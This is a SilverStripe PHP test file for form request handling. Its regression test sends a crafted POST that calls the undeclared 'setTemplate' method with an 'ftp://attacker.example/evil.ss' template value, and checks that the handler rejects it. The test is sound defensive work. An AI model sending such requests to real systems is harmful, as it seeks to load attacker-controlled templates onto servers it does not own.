<?php

namespace SilverStripe\Forms\Tests;

use SilverStripe\Control\Controller;
use SilverStripe\Control\HTTPRequest;
use SilverStripe\Control\HTTPResponse_Exception;
use SilverStripe\Control\Session;
use SilverStripe\Dev\SapphireTest;
use SilverStripe\Forms\FieldList;
use SilverStripe\Forms\FormAction;
use SilverStripe\Forms\FormRequestHandler;
use SilverStripe\Forms\PasswordField;
use SilverStripe\Forms\Tests\FormRequestHandlerTest\TestForm;
use SilverStripe\Forms\Tests\FormRequestHandlerTest\TestFormRequestHandler;
use SilverStripe\Forms\TextField;

class FormRequestHandlerTest extends SapphireTest
{
    public function testCallsActionOnFormHandler()
    {
        $form = new TestForm(
            Controller::curr(),
            'Form',
            new FieldList(),
            new FieldList(new FormAction('mySubmitOnFormHandler'))
        );
        $form->disableSecurityToken();
        $handler = new TestFormRequestHandler($form);
        $request = new HTTPRequest('POST', '/', null, ['action_mySubmitOnFormHandler' => 1]);
        $request->setSession(new Session([]));
        $response = $handler->httpSubmission($request);
        $this->assertFalse($response->isError());
    }

    public function testCallsActionOnForm()
    {
        $form = new TestForm(
            Controller::curr(),
            'Form',
            new FieldList(),
            new FieldList(new FormAction('mySubmitOnForm'))
        );
        $form->disableSecurityToken();
        $handler = new FormRequestHandler($form);
        $request = new HTTPRequest('POST', '/', null, ['action_mySubmitOnForm' => 1]);
        $request->setSession(new Session([]));
        $response = $handler->httpSubmission($request);
        $this->assertFalse($response->isError());
    }

    public function testDoesNotDispatchToNonActionFormMethod()
    {
        // Regression test for a public Form method being callable as an action without being a declared action
        $form = new TestForm(
            Controller::curr(),
            'Form',
            new FieldList(),
            new FieldList(new FormAction('mySubmitOnForm'))
        );
        $form->disableSecurityToken();
        $handler = new FormRequestHandler($form);
        $request = new HTTPRequest('POST', '/', null, [
            'action_setTemplate' => 1,
            'MaliciousTemplate' => 'ftp://attacker.example/evil.ss',
        ]);
        $request->setSession(new Session([]));
        try {
            $handler->httpSubmission($request);
        } catch (HTTPResponse_Exception $e) {
            $this->assertEquals(403, $e->getResponse()->getStatusCode());
        }
        $this->assertNull($form->getTemplate());
    }
}
